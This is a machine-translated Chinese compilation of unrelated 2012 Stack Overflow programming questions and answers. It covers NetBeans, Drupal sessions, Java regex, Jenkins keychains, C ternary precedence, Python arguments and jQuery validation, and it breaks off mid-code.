大多数情况下，我只会使用存储在`Environment.SpecialFolder.ApplicationData`文件夹中的 XML 文件并使用`DataContractSerializer`. 它允许您进行一些版本控制，但最重要的是，当您的设置对象上的某些属性是新的或不存在时，它能够加载和保存 XML 文件。它不会使应用程序崩溃，当您再次保存设置时，它只会保存最新版本。我认为它干净、刻薄、简单。

# netbeans - 在 NetBeans 中保存打开的文件（会话）

> ID：12068081
> 
> 赞同：15
> 
> 时间：2012-08-22T07:18:14.303
> 
> 标签：netbeans, netbeans-7

我想下次保存实际打开的文件（选项卡）并恢复会话（文件组）。NetBeans IDE 7.1.2 中是否有任何选项？我知道 NetBeans 会自动保存我退出 IDE 时打开的文件列表。如何保存打开的文件并在会话之间切换？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-06T22:35:40.597

您正在寻找项目组。看看`File > Project Group`菜单。

在那里，您可以创建定义打开项目列表的项目组。然后，您可以从组切换，所选项目将打开/关闭。

Netbeans 保存每个项目的打开文件列表，因此：

*   如果您的小组不共享项目，您将获得您想要的行为。
*   如果您的组共享项目，则在这些项目中打开的文件将在组之间切换时跟随您。

<3 网豆

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-12-03T23:55:05.520

尝试标签组。

在 Netbeans（至少在 7.3.1 版中）中，单击：窗口 > 配置窗口 > 新建文档选项卡组

现在，打开一个新文件，它应该在一个单独的窗口中打开。

然后，您可以切换最大化窗口/恢复窗口按钮以在您的窗口/选项卡组之间切换。

![恢复窗口](../Images/144dcd3d1a51cd99c64ad4d977879243.png) 恢复窗口按钮

![最大化窗口按钮](../Images/683d958ca97d0629e4a96fd0d3a0ce45.png) 最大化窗口按钮

这是在文件集之间切换的便捷方式，尽管从技术上讲，您并没有按照您在问题中的要求保存这些文件集。不过，当您关闭并重新打开 Netbeans 时，它确实会记住这些选项卡组。

# session - 浏览器上的 Drupal 7 关闭自动注销

> ID：12068093
> 
> 赞同：1
> 
> 时间：2012-08-22T07:18:56.957
> 
> 标签：session, drupal-7

我正在使用 Drupal 7。

drupal?q=用户

当我们登录后，我们关闭浏览器并再次重新打开浏览器，然后它应该要求登录。

但它仍然处于登录状态

我已经使用了会话过期模块并设置了

ini_set('session.cookie_lifetime', 0); 在站点/默认/settings.php

但没有人解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T05:24:09.540

你应该在你的 settings.php 中设置它

```
ini_set('session.gc_maxlifetime', 0);
ini_set('session.cookie_lifetime', 0); 
```

但是在 FireFox session_cookies 中保持活动状态直到浏览器完全关闭，（不会通过仅关闭 drupal 选项卡来终止）:(

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T19:15:54.293

Session Expire 模块在名为 session 的表上创建一个实例，这就是为什么如果你在 setting.php 上更改会话 cookie 什么都不会发生......解决它的唯一方法是创建一个 ajax，在浏览器 clousure 上调用用户/注销页面。

我试图让这个工作没有成功，如果你最终得到了解决方案，你可以与我分享，拜托！

请参阅此链接以获取更多信息：[http ://eureka.ykyuen.info/2011/02/22/jquery-javascript-capture-the-browser-or-tab-closed-event/](http://eureka.ykyuen.info/2011/02/22/jquery-javascript-capture-the-browser-or-tab-closed-event/)

# java - Java如何删除字符串中两个子字符串之间的所有内容

> ID：12068098
> 
> 赞同：0
> 
> 时间：2012-08-22T07:19:23.637
> 
> 标签：java, replace, substring

我想删除以 'galery' 开头并以 'jssdk));' 结尾的字符串中的所有子字符串

例如，考虑以下字符串：
**Galery something something.... jssdk));**

我需要一个算法来删除'something something...'并返回'Galery jssdk));'

这就是我所做的，但它不起作用。

```
newsValues[1].replaceAll("Galery.*?jssdK));", ""); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:29:10.737

可能可以改进，我做得很快：

```
 public static String replaceMatching(String input, String lowerBound, String upperBound{
    Pattern p = Pattern.compile(".*?"+lowerBound+"(.*?)"+upperBound+".*?");
    Matcher m = p.matcher(input);
    String textToRemove = "";

    while(m.find()){
        textToRemove = m.group(1);
    }
    return input.replace(textToRemove, "");
} 
```

**更新**Thx 接受答案，但这里是一个较小的审查版本：

```
 public static String replaceMatching2(String input, String lowerBound, String upperBound){
      String result = input.replaceAll("(.*?"+lowerBound + ")" + "(.*?)" + "(" + upperBound + ".*)", "$1$3");
      return result;
 } 
```

这个想法实际上很简单，将字符串分成 3 组，然后将这 3 组替换为第一组和第三组，删除第二组。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T07:23:09.217

你快到了，但这会删除整个字符串。如果要删除 and 之间的任何内容`Galery`，`jssdK));`则必须执行以下操作：

`String newStr = newsValues[1].replaceAll("(Galery)(.*?)(jssdK\\)\\);)","$1$3");`

这会将字符串分组，然后使用这些组替换整个字符串。请注意，在正则表达式语法中，the`)`是一个特殊字符，因此需要对其进行转义。

```
String str = "GaleryABCDEFGjssdK));";
String newStr = str.replaceAll("(Galery)(.*?)(jssdK\\)\\);)","$1$3");
System.out.println(newStr); 
```

这产生：`GaleryjssdK));`

我知道@amit 提出的解决方案更简单，但是，我认为向您展示一种可以使用该`replaceAll`方法的有用方式是个好主意。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:21:08.233

最简单的解决方案是用“边缘”替换字符串，有效地“删除”^(它们)之间的所有内容。

```
newsValues[1].replaceAll("Galery.*?jssdK));", "GaleryjssdK));"); 
```

* * *

1：我`""`在这里使用它是因为它没有完全替换 - 记住字符串是不可变的，所以它正在创建一个新对象，没有“删除”部分。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T07:30:28.590

```
newsValues[1] = newsValues[1].substring(0,6)+newsValues.substring(newsValues[1].length()-5,newsValues[1].length()) 
```

这基本上将“Galery”和“jssdk”连接起来，离开或忽略其他所有内容。更重要的是，您可以简单地分配 newValues[1] = "Galeryjssdk"

# ios - 授予 Jenkins 解锁钥匙串的权限

> ID：12068101
> 
> 赞同：3
> 
> 时间：2012-08-22T07:19:30.573
> 
> 标签：ios, continuous-integration, jenkins, keychain

我正在尝试为 xcode 设置 Jenkins，但我不断收到认证错误。

在我的 shell 脚本中，我有这个命令：`security unlock-keychain $KEYCHAIN`

但由于 Jenkins 以用户 'jenkins' 身份运行，因此在解锁钥匙串并打印此错误时似乎缺乏权限：

```
[workspace] $ /bin/sh -xe /var/folders/lD/lDiU3VbfHpm-KUHY26PrX++++Do/-Tmp-/hudson2556417005809365518.sh
+ sh build.sh
security: SecKeychainUnlock /Users/vb_admin/Library/Keychains/login.keychain: Could not write to the file. It may have been opened with insufficient access privileges. 
```

任何解决此问题的想法将不胜感激。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:29:42.277

要么给用户'jenkins'更多的权限，要么在你的shell脚本中给文件授予适当的权限。就错误显示而言，它表示“写入”权限不可用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-30T12:00:43.087

让 jenkins 用户访问证书的最佳方法是将证书安装到 jenkins 用户的钥匙串中，而不是弄乱文件系统安全性，并可能让任何有权访问 jenkins 用户的人访问 vb_admin 用户的钥匙串。

`security <CERT_FILE> import -k $HOME/Library/Keychains/login.keychain -Tcodesign`

# web-services - 黑莓 Httpconnection 请求超时问题

> ID：12068102
> 
> 赞同：1
> 
> 时间：2012-08-22T07:19:32.297
> 
> 标签：web-services, blackberry, httpconnection

我面临与 Httpconnection 请求超时（**不是响应超时**）相关的问题。

当我尝试通过应用程序连接服务器时，我得到响应代码**408 或 502**，但相同的 url 在黑莓默认浏览器上工作（**请注意，这仅在 3G 网络中发生**）。

而且这个问题不会每次都重复出现，但它会发生 70% 次。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:28:01.840

来自维基百科[http://en.wikipedia.org/wiki/List_of_HTTP_status_codes](http://en.wikipedia.org/wiki/List_of_HTTP_status_codes)

408 Request Timeout 服务器等待请求超时。[2] 根据 W3 HTTP 规范：“客户端在服务器准备等待的时间内没有产生请求。客户端可以在以后的任何时间重复请求而无需修改。”

502 Bad Gateway 服务器作为网关或代理，收到来自上游服务器的无效响应。

所以我猜测需要在您的应用程序中设置某种代理/网关（可能在您的默认 BB 浏览器中设置）。

干杯!

# backbone.js - 在主干中循环+渲染

> ID：12068103
> 
> 赞同：0
> 
> 时间：2012-08-22T07:19:33.853
> 
> 标签：backbone.js

```
render:function(output){
        _.each(output, function(i){
            p=i.name;
        });
        $(this.el).append(p);
    } 
```

在这里，我以 json 的形式得到输出....我有 100 个名字...我想一个接一个地附加它...在这种情况下，我得到一个名字....如果我这样输入...

```
render:function(output){
        _.each(output, function(i){
            p=i.name;
            $(this.el).append(p);
        });

    } 
```

在每个循环内什么都没有......我需要在这里像 p 一样制作 100 个变量还是有其他方法......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:28:53.693

您需要提供上下文，即this。“this”是对您正在使用的当前对象的引用。但是，当您从当前对象中调用不同的函数时，您将失去对当前对象的引用。基本上，这指的是函数。但是您可以轻松解决此问题。

通过将此作为参数添加到函数调用中：

```
render:function(output){
    _.each(output, function(i){
        p=i.name;
        $(this.el).append(p);
    },this);

} 
```

或者通过辅助变量提供

```
render:function(output){
    var self=this;
    _.each(output, function(i){
        p=i.name;
        $(self.el).append(p);
    });

} 
```

我会选择选项1

# asp.net - 在 Asp.net 3.5 sp1 路由中需要帮助

> ID：12068106
> 
> 赞同：0
> 
> 时间：2012-08-22T07:19:44.917
> 
> 标签：asp.net, routing, url-redirection

我需要使用`querystring id` 例如更改产品名称的 url`www.somedomain.com/Details.aspx?id=256&mc=2` 应该更改为`www.somedomain.com/Details/mens/helmets`

注意：我没有使用 MVC 架构

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T12:26:09.837

您可以使用`Http Handlers`and`HttpContext.RewritePath`来重新编写您的网址

# c# - 通过终端发送 shift+f10

> ID：12068107
> 
> 赞同：0
> 
> 时间：2012-08-22T07:19:52.587
> 
> 标签：c#, terminal, sequence, shift

我制作了一个简单的应用程序来通过终端连接到应用程序。我使用了在互联网上找到的外部库（不记得确切的位置）。代码的工作方式如下：

```
Telnet t = new Telnet("127.0.0.1", 23, 100);
if (!t.Connect())
    return;

t.SendAndWait("?", "> ");
Console.WriteLine(t.lastResponse); 
```

发送`?`到控制台并等待`>`. 但是，我有时需要发送`shift`+ （它是应用程序的*中断*命令），我不知道该怎么做。经过一番研究，我发现我可能需要发送这样的东西：`F10`

 *```
t.SendAndWait("^[1~", "> "); 
```

*^[*将是转义字符，而*1~*我发现在 Windows 中使用 telnet，连接到同一个应用程序并按`F10`. 但我不知道什么代码相当于`shift`，也不知道这是否是正确的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T09:00:21.947

Kindof 解决方法 - 感谢[使用 C# 通过 telnet 发送 Control-N 和 <CR><LF>](https://stackoverflow.com/questions/5022005/sending-control-n-and-crlf-via-telnet-using-c-sharp)并提到页面[http://www.bbdsoft.com/ascii.html](http://www.bbdsoft.com/ascii.html)，我发​​现我也可以使用 CTRL+Y 来中断，以下代码可以正常工作：

```
t.SendAndWait(Char.ToString((char)0x19), "< "); 
```*

# javascript - Javascript的调试/分析工具？

> ID：12068109
> 
> 赞同：0
> 
> 时间：2012-08-22T07:19:58.297
> 
> 标签：javascript, debugging, analyzer, parasoft

请建议我们是否可以对 Javascript 使用任何静态分析工具？可以使用 parasoft 工具吗？任何关于 parasoft 的教程都会有所帮助。

是否有任何其他调试器替代 Opera 蜻蜓？

谢谢斯内哈
_

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:31:07.330

**静态分析：**

*   [JSLint](http://jslint.com/)
*   [JSHint](http://www.jshint.com/)
*   [谷歌关闭](https://developers.google.com/closure/)

**调试器**：

*   Chrome 检查器（`F12`在 Chrome 中）
*   （火狐）[萤火虫](http://getfirebug.com/)
*   （许多浏览器）[Firebug Lite](http://getfirebug.com/firebuglite)
*   (移动 Webkit) [weinre](http://people.apache.org/~pmuellr/weinre/docs/1.x/1.5.0/)

`IE`s 有一些调试器，有些带有，`MS Office`有些带有`Visual Studio`，有点乱，我没有很好的资源。

由于链接模式和动态定义的对象，静态分析器`JavaScript`相当有限。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:25:20.577

如果您需要为前端 Web 开发调试 javascript，那么我发现最有用的调试器是 IE9 调试器。我知道对 Internet Explorer 有很多偏见，但是调试器非常好，当抛出异常时，您实际上会得到一个窗口。

# android - Android中“FimgApiStretch：stretch failed”的原因是什么

> ID：12068110
> 
> 赞同：13
> 
> 时间：2012-08-22T07:20:02.687
> 
> 标签：android

在 logcat 中，它总是注销“FimgApiStretch:stretch failed”。
当我使用列表视图时，它尤其出现。
但它永远不会崩溃或强制关闭。
有谁知道是什么原因？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-08-22T11:03:27.660

这似乎只是在三星设备上登录的某种形式。三星以使用系统消息在 android LogCat 中造成混乱而闻名。

我在装有 Touchwiz ROM 的 Galaxy S3 上经常看到这个问题，但它从未与任何问题相关联。

不要担心它，只是忍受混乱。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T19:32:18.677

我有同样的“问题”得到这个消息。我在尝试使用[小部件开关时看到过](http://developer.android.com/reference/android/widget/Switch.html)

此小部件无法在`S3 texton`或`textoff`（与 S2 一起正常工作）或使用 AVD 上进行自定义。

我对这个问题的理解是，小部件（在您的情况下为 listview 或在我的情况下为 Switch）正在部分工作......

# c# - 如何使用 c# 中的 getter 和 setter 方法获取另一个文件信息的详细信息？

> ID：12068111
> 
> 赞同：0
> 
> 时间：2012-08-22T07:20:09.573
> 
> 标签：c#

```
static string sm_strVersion;
a = Assembly.GetEntryAssembly();
sm_strVersion = "Version:" + a.GetName().Version;
//version.cs file contains below code:

namespace FInclude
{
    public partial class CFontData
    {
        public readonly string ToolVersion = "FL.001";
    }
} 
```

有人可以解释一下`Assembly.GetEntryAssembly()`吗？

在哪里可以获得有关 c# 中所有内置函数的文档？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:24:50.403

`Assembly.GetEntryAssembly()`返回一个类型的对象`Assembly`。所有可用的方法和属性都可以在[`System.Reflection.Assembly`类文档](http://msdn.microsoft.com/en-us/library/system.reflection.assembly.aspx)中找到。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:24:23.413

`Assembly.GetEntryAssembly()`您可以在[此处](http://msdn.microsoft.com/en-us/library/system.reflection.assembly.getentryassembly.aspx)找到有关功能的说明。

你在哪里可以获得所有功能是什么意思？你是说文档？然后从[这里](http://msdn.microsoft.com/en-us/library/)开始。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:33:03.557

正如丹尼斯所说`Assembly.GetEntryAssembly() returns an object of type Assembly`，这个程序集包含`'Main'`方法（即入口点）。

# php - Zend_Form：禁用的复选框表现不佳

> ID：12068112
> 
> 赞同：0
> 
> 时间：2012-08-22T07:20:19.110
> 
> 标签：php, html, zend-framework, checkbox

我正在尝试使用 Zend_Form 添加一个禁用的复选框，然后使用 JS 启用它。

这就是问题所在，zend 添加了一个具有相同名称和值 0 的隐藏输入字段。这是为了确保即使未选中复选框，也会发送 0 值而不是根本没有值。这很棒。但是，如果您将复选框创建为禁用，zend 不会输出此隐藏字段。它输出的只是复选框，被禁用，被选中或不被选中（没关系，因为它被禁用它根本不会提交任何东西）。

我需要允许客户端启用复选框并更改值。

如果禁用，则不提交任何内容，db 复选框值保持不变。如果启用，客户端应该能够选中/取消选中它。问题是现在没有隐藏字段，如果未选中复选框，则不会提交任何内容。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:26:34.943

第一：我不喜欢 Zend 为您处理这个问题的方式。正如您自己发现的那样，添加值为 0 的隐藏字段与禁用复选框不同。

解决您的问题：只需自己添加一个隐藏字段，其中包含原始状态。

例如：

```
<INPUT type="hidden" name="originalStateOfMyCheckbox" value="enabled/disable"> 
```

现在您可以通过首先检查 $_POST["originalStateOfMyCheckbox"] 的值来检查复选框的值。

如果启用：您可以使用 isset($_POST["yourcheckboxname"]) 来确定它是否被选中。

如果禁用：您可以再次使用 isset($_POST["yourcheckboxname"]) 来确定您的 javascript 是否启用了它。

# cocoa-touch - 如何将圆形信息按钮作为 rightbarbuttonitem 添加到导航控制器？

> ID：12068114
> 
> 赞同：0
> 
> 时间：2012-08-22T07:20:30.063
> 
> 标签：cocoa-touch, uibarbuttonitem

我有一个导航控制器。我想向该导航控制器添加一个右栏按钮项。我可以添加一个，但我想要一种特定的样式：标记为“i”并且形状也是圆形。有没有财产可以做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:53:52.373

我认为你问的没有财产。但是您可以制作自定义图像并使用此方法。

```
UIBarButtonItem *addButton = [[UIBarButtonItem alloc] initWithImage:customImage style:UIBarButtonItemStylePlain target:self action:@selector(customButton:)];
addButton.enabled = YES;
self.navigationItem.rightBarButtonItem = addButton; 
```

有关更多详细信息，您可以参考[UIBarButtonItem ClassReference](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIBarButtonItem_Class/Reference/Reference.html)。

# java - pom.xml 中的日志语句或 Maven 的 Tracking flow

> ID：12068115
> 
> 赞同：2
> 
> 时间：2012-08-22T07:20:31.903
> 
> 标签：java, maven, pom.xml

我是 Maven 的新手，我正在努力掌握它。我已经阅读了初学者的教程，并且能够理解基本的东西，但是我的项目中有一个复杂的 pom.xml 文件，我的下一个目标是理解它。

由于从初学者指南中获得的知识有限，我无法理解复杂的 pom.xml，所以我正在考虑在 pom.xml 中添加某种日志语句或寻找一种替代方法，通过它我可以跟踪在 pom.xml 中执行，因为这将帮助我了解事情是如何发展的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:35:21.310

我相信 maven 中的调试选项生成的输出可能非常庞大且阅读起来非常耗时。我只将它用于一些特定的问题分析。

对我来说，它总是通过阅读并尝试理解特定部分作者的意图来处理复杂的 pom.xml 文件（我认为 pom.xml 元素的良好参考可以在以下位置找到：[http://maven.apache .org/pom.html](http://maven.apache.org/pom.html)）。

之后运行构建后，您可以看到它执行了什么以及何时执行，并且您可以找到您之前所学的内容和它的实际工作方式之间的映射:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T07:51:25.070

[您可以使用maven-antrun-plugin](http://maven.apache.org/plugins/maven-antrun-plugin/)将一些日志消息打印到 maven 控制台，您还可以指定要在其中打印消息的[阶段](http://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html)，请参见下面的代码（它转到插件部分）

```
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-antrun-plugin</artifactId>
    <version>1.6</version>
    <executions>
        <execution>
            <id>print-log</id>
            <phase>initialize</phase>
            <goals>
                <goal>run</goal>
            </goals>
            <configuration>
                <target>
                    <echo message="Your log message for project ${project.artifactId}" />
                </target>
            </configuration>
        </execution>
    </executions>
</plugin> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T08:09:11.803

我建议阅读更多关于[Maven 构建生命周期](http://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html)的信息。Maven**不是**类似脚本的构建自动化工具（如[ant](http://ant.apache.org/)或[make](http://www.gnu.org/software/make/)）。这是一种不同的方法。日志应该不如`./target`目录中生成的输出工件重要。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-22T07:26:22.493

您可以从发行开始

```
mvn -X install 
```

这将为您提供执行流程。

根据`mvn --help`：

```
-X,--debug     Produce execution debug output 
```

* * *

如果您想查看所有依赖项、属性、插件、目录等，请尝试以下方法：

```
mvn help:effective-pom 
```

# c - 在包含三元运算符的表达式中使用括号

> ID：12068118
> 
> 赞同：1
> 
> 时间：2012-08-22T07:20:50.357
> 
> 标签：c, ternary-operator

> **可能重复：**
> [错误：这个简单的 C 代码中需要左值？（三元分配？）](https://stackoverflow.com/questions/6966299/error-lvalue-required-in-this-simple-c-code-ternary-with-assignment)

在下面的代码中，我收到了类似“ `lvalue required as left operand of assignment`”的错误。我无法理解为什么会报告这样的错误。但是当我在表达式中使用括号时，就像`(i>j)?(k=i):(k=j)`它没有报告错误一样。请解释。

```
int main() {
    int i = 2;
    int j = 9;
    int k;

    (i>j) ? k=i : k=j;
    printf("%d\n",k);
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:34:20.170

没有你额外的 ()s，我认为运算符优先级将其分组为

   `((i>j)?k=i:k)=j;`

这显然不是您想要的，并且确实存在左值问题。

修复它

  `k= (i>j) ? i : j;`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T07:35:09.607

很明显，可以以更好的方式重写此条件，但是由于`=`and`?:`运算符的优先级，可以观察到您的问题。

赋值运算符`?:`的优先级高于`=`，因此表达式

```
( i > j ) ? k = i : k = j; 
```

相当于

```
(( i > j ) ? k = i : k) = j; 
```

这是不正确的，因为您不能分配给表达式结果。

事实上，这种情况与`(( i > j ) : i : j) = 10;`不正确的情况相似。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T07:24:28.400

怎么写成这样。

```
int main()
 {
   int i,j,k;
   i=2;j=9;
   k = (i > j) ? i : j;
   printf("%d\n",k);
   return 0;
 } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T07:25:02.917

相当 ：

```
k = i > j ? i : j; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-22T07:30:48.360

您需要分配此运算符的返回值。三元运算符的语法如下..

```
result = condition ? first_expression : second_expression; 
```

你在你的代码中遗漏了..所以你可以简单地把它放在下面..

```
int k = (i > j) ? i : j; 
```

# python - 如何从 Python 脚本访问命令行参数？

> ID：12068121
> 
> 赞同：0
> 
> 时间：2012-08-22T07:20:52.760
> 
> 标签：python, command-line-arguments

我正在用 Python 编写代码，我应该使用命令行运行，当我调用脚本时，我应该给出一些我将在代码中使用的参数。我可以用什么来实现这一目标？

要运行脚本，它将是这样的：

```
python myscript.py s1 s2 s4 
```

where `s1`, `s2`and`s4`将是我将在我的代码中使用的参数。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T07:23:28.003

快速肮脏的方式

```
import sys
s1, s2, s4 = sys.argv[1:4] 
```

（`sys.argv[0]`是脚本的名称）

为了获得更大的灵活性，您可以使用[argparse](http://docs.python.org/library/argparse.html)模块

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-22T07:24:38.500

查看：[http ://docs.python.org/library/argparse.html](http://docs.python.org/library/argparse.html)

Python 有一个内置的参数解析器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T07:24:01.747

这在优秀的[Python 教程中标题为](http://docs.python.org/tutorial/)[“参数传递”](http://docs.python.org/tutorial/interpreter.html#argument-passing)的部分中进行了描述。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-22T07:25:01.770

你可以试试：

```
import sys
print "file name:", sys.argv[0]
for i in range(1, len(sys.argv)):
    print "param:\t", i, sys.argv[i] 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-22T07:30:48.390

这是一种常见问题解答。该`sys`模块具有访问解释器详细信息的工具。其中一个属性`sys.argv`是传递给`interpreter`. 因此，当您`sys.argv`从由解释器执行的 python 程序访问时，您将程序本身作为第一个参数，然后在从索引 1 开始的列表中跟随它的其余参数。

```
$ cat 1.py 
import sys
print sys.argv 
```

当我执行它时。

```
$python 1.py 0
['1.py', '0'] 
```

# php - 使用 PHP Mongo 连接到哪个 Mongo 服务器？

> ID：12068128
> 
> 赞同：1
> 
> 时间：2012-08-22T07:21:17.127
> 
> 标签：php, mongodb

我有 3 个副本集，每个副本集在自己的分片中。每个副本集有 2 个 Mongo 服务器（主服务器和从服务器）。

使用 Mongo() 的连接字符串时，我应该连接到哪个服务器？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:31:16.563

如果您有一个[分片环境](http://www.mongodb.org/display/DOCS/Sharding+Introduction)，您应该运行一台或多[`mongos`](http://www.mongodb.org/display/DOCS/Sharding+Introduction#ShardingIntroduction-RoutingProcesses%28mongos%29)台服务器（通常每个应用程序服务器一台），而不是直接连接到副本集。

[MongoDB 文档的](http://www.mongodb.org/display/DOCS/Sharding+Introduction#ShardingIntroduction-RoutingProcesses%28mongos%29)摘录：

```
The mongos process can be thought of as a routing and coordination process
that makes the various components of the cluster look like a single system.
When receiving client requests, the mongos process routes the request to the
appropriate server(s) and merges any results to be sent back to the client. 
```

与服务器的[连接](http://php.net/manual/en/mongo.connecting.php)`mongos`应指定为与连接`mongod`服务器相同，例如：

```
<?php

    $m = new Mongo("mongodb://mymongos1:27017");

?> 
```

# javascript - jquery.validator 和一页上的两个联系表单将在提交时验证空的一个

> ID：12068129
> 
> 赞同：1
> 
> 时间：2012-08-22T07:21:18.543
> 
> 标签：javascript, jquery, html, web, validation

我目前在网页上使用了两个相同的联系表格。一个在每一页上——在横幅中，另一个版本在联系页面本身的主要部分。这是我用来验证它的：

```
$(".contactform").each(function() {
    $(this).validate();
}); 
```

但是，当我在任一表单上单击提交时，其中一个（未使用的）会返回显示错误。我不希望这个人必须填写两者（因为它们是完全相同的表格）并且对从这里去哪里有点困惑。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T15:47:05.680

根据 xnnyygn 的回答，我最终做的是按 id 添加单独的 .validate 规则，当按类或表单完成时，这将不起作用并显示第一次选择错误结果。

```
$("#contactform1").validate({
  rules: {
    field: {
      required: true
    }
  }
});

$("#contactform2").validate({
  rules: {
    field: {
      required: true

    }
  }
});

$(document).ready(function(){
  $("#contactform1").validate();
  $("#contactform2").validate();
}); 
```

我最终在这里使用了两个 id 而不是类或表单选择器。不这样做是行不通的。经验教训，使用 jquery.validator 你必须使用 ids。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:14:37.650

这是我的[测试 HTML](https://gist.github.com/3423567)，来自[http://docs.jquery.com/Plugins/Validation#source](http://docs.jquery.com/Plugins/Validation#source)，添加了具有相同类的重复表单。

我尝试直接调用验证，但是当我按下第二个提交按钮时，第一个表单被验证。但是，单独调用 validate 效果很好。

验证器“跳转”到另一个表单的原因可能是 jquery 验证器只采用第一个元素（表单）并应用规则。有关更多详细信息，请参阅源代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:40:22.560

不确定它是否能解决这个问题，但您不需要明确使用 '.each()'。写吧：

```
$(".contactform").validate(); 
```

# c# - 在网站中存储文件的适当位置是否合适？像一个临时文件？

> ID：12068135
> 
> 赞同：0
> 
> 时间：2012-08-22T07:21:42.633
> 
> 标签：c#, asp.net-mvc

我有一个 MVC 应用程序，它下载一个文件，然后必须解压缩它并使用数据。

存储此文件的正确位置在哪里？

如果我使用的是 Windows 窗体应用程序，我会将其存储在 bin 中并使用以下内容获取路径。我正在尝试为 Web 应用程序做同样的事情？

```
String path = Application.StartupPath; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T09:42:42.877

在项目的根目录中创建一个文件夹并将其命名为“Temp”或类似名称。将下载的文件存储在其中。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-22T07:26:31.637

我认为最好的地方是在应用程序的根文件夹之外创建一个文件夹，这样网站用户就无法访问这个文件夹。

要访问此文件夹，您主要有两个选项：

1.  在 IIS 级别上创建一个虚拟目录并访问它。
2.  使用 AspEnableParentPaths，这里是一个例子：http: [//msdn.microsoft.com/en-us/library/ms524697%28v=vs.90%29.aspx](http://msdn.microsoft.com/en-us/library/ms524697%28v=vs.90%29.aspx)

# android - 如何访问和显示 sd 卡中的播放列表、艺术家和所有音乐文件？

> ID：12068140
> 
> 赞同：0
> 
> 时间：2012-08-22T07:22:06.880
> 
> 标签：android, android-mediaplayer

我是 android 开发新手，我正在使用 mediaplayer 实现一个简单的应用程序。我对如何从 sdcard 访问所有 mp3 文件有点困惑。我正在使用以下代码从 sdcard 下的歌曲文件夹中检索歌曲。但是在歌曲文件夹中，我有更多的子文件夹，其中包含很多音频文件。我正在使用以下代码来检索歌曲。但它正在加载歌曲下的文件，而不是加载父文件夹（sdcard/songs）的其他子文件夹歌曲。你们能否帮助我了解如何从 SDCard 访问所有音频文件、播放列表、艺术家。

```
public class SongsManager {
// SDCard Path
final String MEDIA_PATH = new String("/sdcard/songs");
private ArrayList<HashMap<String, String>> songsList = new ArrayList<HashMap<String, String>>();

// Constructor
public SongsManager(){

}

/**
 * Function to read all mp3 files from sdcard
 * and store the details in ArrayList
 * */
public ArrayList<HashMap<String, String>> getPlayList(){
    File home = new File(MEDIA_PATH);

    if (home.listFiles(new FileExtensionFilter()).length > 0) {
        for (File file : home.listFiles(new FileExtensionFilter())) {
            HashMap<String, String> song = new HashMap<String, String>();
            song.put("songTitle", file.getName().substring(0, (file.getName().length() - 4)));
            song.put("songPath", file.getPath());

            // Adding each song to SongList
            songsList.add(song);
        }
    }
    // return songs list array
    return songsList;
}

/**
 * Class to filter files which are having .mp3 extension
 * */
class FileExtensionFilter implements FilenameFilter {
    public boolean accept(File dir, String name) {
        return true;
    }
} 
```

}

谢谢你，钱德拉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:29:29.423

尝试这个。

```
String[] STAR = { "*" };
int totalSongs;
public void ListAllSongs() 
    {
        Uri allsongsuri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
        String selection = MediaStore.Audio.Media.IS_MUSIC + " != 0";

        if (MusicUtils.isSdPresent()) {
            cursor = managedQuery(allsongsuri, STAR, selection, null, null);

            totalSongs = cursor.getCount();

            if (cursor != null) {
